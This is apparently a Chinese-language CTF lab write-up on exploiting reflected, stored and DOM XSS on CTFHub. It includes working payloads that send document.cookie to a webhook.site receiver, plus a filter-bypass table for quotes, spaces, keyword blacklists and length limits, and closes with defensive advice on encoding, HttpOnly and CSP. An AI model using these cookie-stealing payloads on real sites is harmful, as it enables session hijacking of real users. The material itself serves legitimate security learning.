【微方法论】Web XSS 漏洞基础利用与 OOB 外带手法小结（基于CTFHub）

操作者：何芊宏 | 操作日期：2026.9.23 | 分类：Web安全 | 标签：XSS, OOB外带, Webhook, 漏洞利用, 微方法论

1. 简介与核心逻辑

XSS（跨站脚本攻击）的本质，是攻击者将恶意 JavaScript 代码注入到网页中，当其他用户（或机器人）访问该页面时，代码在其浏览器内执行。根据恶意代码的存储与反射方式，分为反射型、存储型和 DOM 型。

本次实战的核心攻击逻辑为：寻找注入点 -> 验证漏洞存在 -> 根据防御机制构造绕过 Payload -> 利用 OOB（带外数据）技术窃取管理员的 Cookie（即 Flag）。

1.1 核心概念：带内（In-Band）与带外（Out-of-Band）的区别

在安全测试中，漏洞利用的结果根据回显方式分为两类：

  • 带内通信（In-Band）：攻击者发送请求后，结果直接回显在页面上，攻击者能当场看到。例如输入 <script>alert(1)</script> 后页面直接弹窗，或输入 SQL 注入语句后页面直接报错并显示数据库内容。这是最理想、最直接的情况。
  • 带外通信（Out-of-Band, OOB）：攻击者发送请求后，目标页面没有任何明显反应（盲打），但目标服务器或浏览器在后台悄悄发起了一个网络请求，将数据发送到了攻击者控制的第三方服务器上。攻击者必须去第三方服务器才能获取结果。

在本次 XSS 实战中，我们攻击的目标是机器人（Bot）的浏览器。我们无法直接看到机器人浏览器的弹窗或页面内容。因此，必须使用 OOB 外带技术，让机器人的浏览器主动把 Cookie 发送到我们搭建的 Webhook 接收器上。OOB 外带包含三个核心要素：

  1. 数据：要窃取的内容，如 document.cookie。
  2. 通道：发起网络请求的函数，如 fetch()、new Image()、location.href。
  3. 接收端：攻击者控制的第三方服务器，如 webhook.site。
关于颜色高亮的说明（贯穿全文）：
1. 绿色：表示能够直接执行、成功绕过防御并完成外带的 Payload 或代码片段。
2. 红色：表示被靶场过滤、引发浏览器转码或导致 JS 语法崩溃的代码片段。
3. 蓝色：表示容易混淆的注入点、错误的提交位置或特定工具环境。

2. 三种 XSS 场景的差异与 Payload 构造策略

2.1 反射型 XSS（Reflected XSS）

  • 原理与场景：恶意代码作为参数发送给服务器，服务器未经处理直接“反射”回浏览器执行。属于一次性攻击，不会存储到数据库。
  • 输入位置：通常在页面的 What's your name 等输入框，或者 URL 参数中。
  • Payload 构造：常规测试使用 <script>alert(1)</script>。外带时，需拼接 document.cookie。
  • 与机器人（Bot）的交互：需要复制包含恶意 Payload 的完整靶场长 URL（如 http://challenge.../?name=%3Cscript%3E...），粘贴到 Send URL to Bot 框中发送。

2.2 存储型 XSS（Stored XSS）

  • 原理与场景：恶意代码被服务器存储到数据库（如留言板、昵称）。任何访问该页面的用户（包括管理员）都会触发执行。属于持久性攻击。
  • 输入位置：页面允许持久化修改的地方，如 Change name 输入框。
  • Payload 构造：提交 <script>new Image().src='//webhook.site/.../?c='+document.cookie> 等外带代码。
  • 与机器人（Bot）的交互：只需复制靶场的基础 URL（如 http://challenge.../），粘贴到 Send URL to Bot 中发送。代码已在数据库中，Bot 访问该页面即可触发。

2.3 DOM 型 XSS（DOM-based XSS）

  • 原理与场景：服务器不参与处理恶意代码。前端 JavaScript 代码（如 innerHTML、document.write、eval）直接读取 URL 参数并写入页面，导致代码执行。
  • 输入位置：输入框可能为灰色不可编辑。需要在 URL 中手动构造 ?jumpto=、?url= 等参数。
  • Payload 构造：需精确控制 URL 参数。若前端使用了 innerHTML，<script> 标签不执行，需使用 <img/src=x/onerror=...> 等。
  • 与机器人（Bot）的交互：必须复制包含恶意参数的完整 URL，粘贴到 Send URL to Bot 框发送。遇到转码问题时，需使用控制台（Console）或编码绕过。

3. 通用攻击流程（OOB 外带详细步骤）

第一步：工具准备与漏洞探测

  1. 打开浏览器，按 F12 打开开发者工具，保持 Elements 和 Network 面板开启。
  2. 在靶场输入框（如 What's your name 或 Change name）输入测试 Payload：<script>alert(1)</script>，点击 Submit。
  3. 若成功弹窗，说明漏洞存在。若未弹窗，进入 Elements 面板，搜索 img 或 script，观察输入内容在 HTML 中的位置以及是否被过滤。

第二步：搭建 OOB 接收器

  1. 新开标签页访问 https://webhook.site，获取专属 URL（注意：务必去除URL中的 #!/view/ 部分，仅保留 https://webhook.site/UUID）。
  2. 构造基础外带 Payload（推荐使用无空格的 fetch 函数作为网络请求通道）：
    <svg/onload="fetch('//webhook.site/你的专属ID/?c='+document.cookie)">

第三步：注入 Payload 并提交

  1. 将外带 Payload 输入到靶场输入框（如 What's your name），点击 Submit。
  2. 此时自己的浏览器会向 Webhook 发送一条记录，通常显示 cookie (empty)，这是正常现象，忽略即可。

第四步：发送给机器人触发漏洞

  • 情况A（反射型 / DOM型）：复制浏览器地址栏生成的包含Payload的完整长 URL（http://challenge.../?name=%3Csvg...）。滚动页面到底部，粘贴到 Send URL to Bot 的 URL 输入框，点击 Send。
  • 情况B（存储型）：复制浏览器地址栏的靶场基础 URL（http://challenge.../）。粘贴到 Send URL to Bot 输入框，点击 Send。

第五步：Webhook 收网

  1. 点击 Send 后，页面出现绿色 Successfully 字样，说明机器人已接收指令。
  2. 切回 Webhook 页面，点击刷新。观察 INBOX 列表。
  3. 忽略自己产生的空 Cookie 记录，寻找 来自新 IP、新 User-Agent 的新记录。点开记录，在 Query strings 的 c 或 cookie 参数中提取 ctfhub{...}。

4. 常见防御机制与 Payload 绕过对照表（核心）

遇到的状况（防御机制） 现象 对应的 Payload 绕过方案
引号冲突与转码 前端代码将输入包裹在单引号中（'...输入...'）。输入带有单引号 ' 的 Payload，浏览器地址栏将其转码为 %27，机器人执行时抛出 JS 语法错误，请求未发出。 使用反引号 ` 替代单引号。例如：
<img/src=x/onerror="new Image().src=`//webhook.site/?c=`+document.cookie">
空格过滤 输入 <img src=x> 后，空格被删除，变成 <imgsrc=x>，无法被浏览器解析；JS 代码如 new Image() 变成 newImage()，执行报错。 1. HTML 标签内使用斜杠 / 代替空格（如 <svg/onload=...>）。
2. JS 内部换用单单词函数 fetch()，或使用注释 /**/ 替代空格（如 new/**/Image()）。
关键词过滤（黑名单） 输入 <script>alert(1)</script> 后，script 标签被删除，页面显示 <>alert(1)，无法执行。 1. 更换标签：使用 <svg/onload=confirm(1)> 或 <details/open/ontoggle=...>。
2. 更换函数：使用 confirm(1)、prompt(1) 替代 alert(1)。
长度限制 在 Send URL to Bot 框粘贴长 URL 时，由于输入框字符限制或后端接收限制，导致 URL 被截断，机器人无法访问完整地址。 1. 精简 Payload：使用 //webhook.site 代替 https://，使用 c= 代替 cookie=。
2. 使用短网址服务（如 is.gd）将 Webhook 地址缩短。
HttpOnly 保护（无解） 服务器设置了 HttpOnly 标志，document.cookie 读取不到 Flag，外带请求参数为空。 放弃读取 Cookie。尝试利用 XSS 读取页面 DOM 中的 CSRF Token，或直接发起 CSRF 请求。在 CTF 中常换用其他读取方式。

5. 踩坑记录与防御建议

5.1 踩坑记录

  • 混淆“代码”与“网址”：在利用 Send URL to Bot 时，绝对不可将 <script>... 代码本体直接粘贴到 URL 框中。必须复制浏览器地址栏中包含该代码的完整靶场 URL（以 http://challenge-... 开头）发送给机器人。
  • “空 Cookie”的自我干扰：提交外带 Payload 的瞬间，自己的浏览器一定会触发一次 Webhook 请求，参数显示为 cookie (empty)。不要看到空记录就以为攻击失败，必须耐心等待机器人（具有不同 IP 和 Referer）发来的新记录。
  • DOM 型的代码追踪：在 Sources 面板全局搜索 test 等通用词会淹没在海量前端库代码中。应直接定位 index.html，搜索 location、innerHTML、eval 等关键函数，精准定位漏洞代码。
  • 502 Bad Gateway 的应对：靶场环境经常出现后端初始化慢或崩溃的情况。遇到 502 不要反复刷新，直接点击“停止并销毁环境”，重新开启，等待 10-20 秒后再访问。

5.2 安全防御建议

  • 输入过滤与输出编码：对用户输入的特殊字符（如 <、>、"、'）进行严格过滤。根据数据所在的上下文（HTML 标签内、属性内、JS 内、CSS 内）采用不同的编码策略。
  • 设置 HttpOnly 标志：在响应头中为所有包含敏感信息的 Cookie 添加 HttpOnly 标志，使 JavaScript 无法读取，从根源上阻断常规的 Cookie 窃取。
  • 启用 Content Security Policy (CSP)：通过配置 CSP 策略，限制浏览器只能执行可信来源的脚本，禁止内联 JS 执行，并限制网络请求的外部发送目标，从纵深防御角度降低 XSS 危害。
